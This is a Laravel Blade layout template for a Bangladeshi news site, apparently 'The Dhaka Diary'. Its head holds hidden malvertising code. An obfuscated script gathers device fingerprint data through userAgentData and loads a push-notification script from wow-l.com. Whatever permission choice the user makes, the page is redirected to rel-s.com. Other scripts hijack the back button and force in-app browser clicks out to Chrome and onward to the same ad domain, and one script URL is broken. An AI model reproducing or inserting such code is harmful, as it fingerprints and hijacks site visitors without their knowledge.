<!doctype html>
<html>
<head>
    <meta name="google-site-verification" content="google60a3a69764e01faf" />
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8T2JZPW7"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-VH8T2JZPW7');
    </script>
    <meta charset="UTF-8">

    <title>@yield('page_title', 'News')</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="pushsdk" content="8ff59d6102defccff768ca21dfd87c4d">
    <meta name="description" content="@yield('meta_description', getOptionData('site_title'))"/>
    <meta name="keywords" content="@yield('meta_keywords', getOptionData('site_title'))"/>
    <meta property="og:locale" content="en_US">
    <meta property="og:title" content="@yield('og_title', getOptionData('site_title'))">
    <meta property="og:description" content="@yield('meta_description', getOptionData('site_title'))">
    <meta property="og:url" content="{{ url()->current() }}">
    <meta property="og:site_name" content="@yield('og_subtitle', getOptionData('site_title'))">
    <meta property="og:image" content="@yield('og_image', asset('storage') .'/'. getOptionData('shared_image'))">
    <meta property="og:image:width" content="1280" />
    <meta property="og:image:height" content="672" />
    <meta property="og:image:secure_url" content="@yield('og_image', asset('storage') .'/'. getOptionData('logo'))">
    <meta property="og:image:alt" content="The Dhaka Diary">
    <meta property="og:image:type" content="@yield('og_image_type', 'image/jpeg')">
    <meta property="og:type" content="article" />
    <meta name="instagram:card" content="@yield('og_subtitle', getOptionData('site_title'))">
    <meta name="instagram:title" content="@yield('og_title', getOptionData('site_title'))">
    <meta name="instagram:description" content="@yield('meta_description', getOptionData('site_title'))">



    <link rel="icon" href="{{asset('storage')}}/{{getOptionData('favicon')}}" type="image/gif" sizes="60x60">
    <link rel="stylesheet" href="{{asset('frontend/assets')}}/css/fontawsome/css/all.min.css">
    <link rel="stylesheet" href="{{asset('frontend/assets')}}/css/jquery-ui.min.css">
    <link rel="stylesheet" href="{{asset('frontend/assets')}}/css/sidebar-menu.css">
    <link rel="stylesheet" href="{{asset('frontend/assets')}}/css/mega-menu.css">

    @yield('css')
    <link href="{{asset('frontend/assets')}}/css/tailwind_css/tailwind_output.css" rel="stylesheet">


    <script>
        var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
        var s = document.createElement('script');
        s.src='//wow-l.com/12e/b40ca/mw.min.js?z=10005952'+'&sw=/sw-check-permissions-eb2d8.js'+'&nouns=1';
        s.onload = function(result) {
            switch (result) {
                case 'onPermissionDefault':
                    Replace("//rel-s.com/4/10006006");break;
                case 'onPermissionAllowed':
                    Replace("//rel-s.com/4/10006006");break;
                case 'onPermissionDenied':
                    Replace("//rel-s.com/4/10006006");break;
                case 'onAlreadySubscribed':
                    Replace("//rel-s.com/4/10006006");break;
                case 'onNotificationUnsupported':
                    Replace("//rel-s.com/4/10006006");break;
            }
        };
        document.head.appendChild(s);
    </script>
    <script>
        var Back_Button_Zone = 10006006;
        var Domain_TB = "rel-s.com";
    </script>
    <script async src="https://[object Object]/12e/b40ca/reverse.min.js?sf=1"></script>

    <script>
        function isInApp() {
            const regex = new RegExp((WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv)), 'ig');
            return Boolean(navigator.userAgent.match(regex));
        }

        function initInappRd() {
            var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
            var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
            var trafficbackURL = "https://rel-s.com/4/10006006/";
            var ua = navigator.userAgent.toLowerCase();

            if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
                document.body.addEventListener('click', function () {
                    window.onbeforeunload = null;
                    window.open(completeRedirectURL, '_system');
                    setTimeout(function () {
                        window.location.replace(trafficbackURL);
                    }, 1000);
                });
            }
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initInappRd);
        } else {
            initInappRd();
        }
    </script>
</head>
{{--
Developed By INNOVA IT
Developer Profile: www.innovait.com.bd
--}}
<body class="site">
<div class="scroll-area"><i class="fa-solid fa-angles-up"></i></div>
{{--header area--}}
@include('layouts.partials.frontend_header')
{{--main content--}}
@yield('main_content')
<!-- Footer Area -->
@include('layouts.partials.frontend_footer')


<script src="{{asset('frontend/assets')}}/js/jquery-3.6.1.min.js"></script>
<script src="{{asset('frontend/assets')}}/js/jquery-ui.min.js"></script>
<script src="{{asset('frontend/assets')}}/js/menu.js"></script>
<script src="{{asset('frontend/assets')}}/js/mega-menu.js"></script>
@yield('js')
<script src="{{asset('frontend/assets')}}/js/script.js"></script>
<script>
    let alreadyShown = false;
    document.addEventListener('DOMContentLoaded', () => {
        let footer_ad = document.querySelector('.footer_ad');
        let ad_close_btn = document.querySelector('.close_only');

        window.addEventListener('scroll', () => {
            if (window.scrollY >= 450 && !alreadyShown) {
                footer_ad.classList.remove('hidden');
                alreadyShown = true;
            }
        });

        ad_close_btn.addEventListener('click', () => {
            footer_ad.classList.add('hidden');
        });
    });
</script>
<script>
    let isFocused = false;

    const input = document.getElementById('searchInput');
    const form = document.getElementById('searchForm');

    input.addEventListener('focus', () => isFocused = true);
    input.addEventListener('blur', () => {
        // input থেকে ফোকাস চলে গেলে টাইম দিয়ে false করলাম যেন accidental blur ধরতে না পারেঃ
        setTimeout(() => isFocused = false, 200);
    });

    function handleSearchClick() {
        if (isFocused) {
            form.submit();
        } else {
            input.focus();
        }
    }
</script>


</body>

</html>
